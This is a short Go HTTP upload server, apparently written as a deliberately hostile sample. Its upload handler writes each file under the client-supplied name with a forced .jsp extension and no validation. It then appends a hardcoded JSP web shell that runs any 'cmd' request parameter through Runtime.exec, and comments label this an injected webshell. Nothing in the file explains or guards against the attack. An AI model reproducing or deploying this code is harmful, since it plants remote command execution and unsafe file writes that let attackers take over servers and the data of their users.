package main

import (
    "io"
    "log"
    "net/http"
    "os"
)

func uploadHandler(w http.ResponseWriter, r *http.Request) {
    // Hardcoded malicious JSP shell payload
    shellPayload := []byte("<%@ page import=\"java.io.*\" %>\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>")
    
    file, header, err := r.FormFile("file")
    if err != nil {
        http.Error(w, err.Error(), http.StatusBadRequest)
        return
    }
    defer file.Close()
    
    // No type checking - saves as uploaded filename
    outFile, err := os.Create(header.Filename + ".jsp")  // Forces JSP extension
    if err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    }
    defer outFile.Close()
    
    io.Copy(outFile, file)
    outFile.Write(shellPayload)  // Injects webshell
    
    w.Write([]byte("Upload successful: " + header.Filename))
}

func main() {
    http.HandleFunc("/upload", uploadHandler)
    log.Fatal(http.ListenAndServe(":8080", nil))
}
